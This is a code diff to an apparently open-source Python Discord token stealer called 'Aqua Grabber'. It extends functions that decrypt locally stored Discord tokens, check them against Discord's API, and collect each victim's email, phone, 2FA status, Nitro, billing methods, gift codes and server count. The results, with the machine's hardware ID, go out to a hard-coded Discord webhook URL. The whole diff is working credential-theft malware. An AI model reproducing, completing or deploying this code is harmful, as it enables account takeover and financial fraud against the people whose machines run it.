@@ -123,6 +123,15 @@ def getDcToken():
         else:
             return True
 
+    def variant2_Status(token):
+        response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}', headers={'Authorization': token})
+        if response.status_code == 401:
+            return False
+        elif "You need to verify your account in order to perform this action." in str(response.content):
+            return True
+        else:
+            return True
+
     def decrypt_token(buff, master_key):
         try:
             return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
@@ -145,32 +154,56 @@ def getDcToken():
 
         def HasBilling():
             if str(billing) == "[]":
-                return f"\nBilling : :x:\n\n"
+                return f"\n💳 Billing : :x:\n\n"
             else:
-                return f"\nBilling : ```{billing}```"
+                payment_methods = []
+                for method in billing:
+                    if method['type'] == 1:
+                        payment_methods.append('💳')
+
+                    elif method['type'] == 2:
+                        payment_methods.append("<:paypal:973417655627288666>")
+
+                    else:
+                        payment_methods.append('❓')
+
+                payment_methods = ', '.join(payment_methods)
+                return f"\n💳 Billing : ```{payment_methods}```"
+
+        def getGuilds():
+            NumberOfServer = 0
+            for guild in guilds:
+                # gonna continue here later
+                NumberOfServer = NumberOfServer + 1
+            return f"\n:floppy_disk: Victim Is In `{NumberOfServer}` Discord Guilds"
 
         def HasGifts():
             if str(gift_codes) == "[]":
-                return f"\nGift Codes : :x:\n\n"
+                return f"\n<a:gift:1021608479808569435> Gift Codes : :x:\n\n"
             else:
-                return f"\nGift Codes : ```{gift_codes}```"
+                return f"\n<a:gift:1021608479808569435> Gift Codes : ```{gift_codes}```"
 
         username = TokenUser['username'] + '#' + TokenUser['discriminator']
         user_id = TokenUser['id']
         email = TokenUser['email']
         phone = TokenUser['phone']
         mfa = TokenUser['mfa_enabled']
+        nitro = bool(TokenUser.get("premium_type"))
         avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.gif" if requests.get(
             f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{TokenUser['avatar']}.png"
         webhook.content = f'```{user} | {username} | HWID: {get_HWID()}```'
         webhook.add_embed(embed)
-        embed.set_title(f"`{username}` Info")
+        embed.set_title(f"<a:Lightblue_Verification:1018036944946602025>  Discord Info  <a:Lightblue_Verification:1018036944946602025>\n\nUsername : `{username}`")
         embed.set_image(avatar)
         embed.set_description(
-            f"Token : ```{token}```\nEmail : ```{email}```\nPhone : ```{phone}```\nHas MFA Enabled? : ```{mfa}```{HasBilling()}{HasGifts()}")
+            f"\n[<:arrows_right:988374645889699870> Go Check Out The Github <:aqua:1181665113611173969>](https://github.com/AquaLT/Aqua-Grabber)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
+        embed.set_footer("💦 Grabbed By Aqua | Made By AnonCx & laylaa | Grabbed By Aqua 💦")
+
         webhook.execute()
         webhook.remove_files()
         webhook.remove_embeds()
+        print(getGuilds())
+        print("ONG THIS ONE WORKED")
 
     def get_tokens(path):
         cleaned = []
@@ -230,9 +263,12 @@ def getDcToken():
             with open(f"{Aqua}/Info/{fileInfo}", "a") as f:
                 for i in tokens:
                     f.write(str(i) + "\n")
-                    print(f"{i} [{checkToken(i)}]")
-                    if checkToken(i):
-                        getUserData(i)
+                    print(f"{i} [1: {checkToken(i)}] [2: {variant2_Status(i)}]")
+                    if checkToken(i) & variant2_Status(i):
+                        try:
+                            getUserData(i)
+                        except:
+                            print("Token Invalid")
 
     main_tokens()
 
@@ -245,7 +281,6 @@ def cleanUp():
 webhook_url = 'https://discord.com/api/webhooks/1181292565551656960/CKgsPF6b19sUj6cKdxdOl0PDBWi_IeArbn887nBygG1JCmCTuj3Cg3-kg1bcaNtHlpfq'
 webhook = DiscordWebhook(url=webhook_url)
 embed = DiscordEmbed()
-embed2 = DiscordEmbed()
 webhook.username = "Aqua Grabber"
 webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179144552154673252/1181320259333005373/de750a3b084de1802279c1f42ab0fc33.png?ex=6580a139&is=656e2c39&hm=647afff7f3e0e7e3a7f912ce7da5d30e3599ae61695e0dea54333bbba8d5db02&"
 
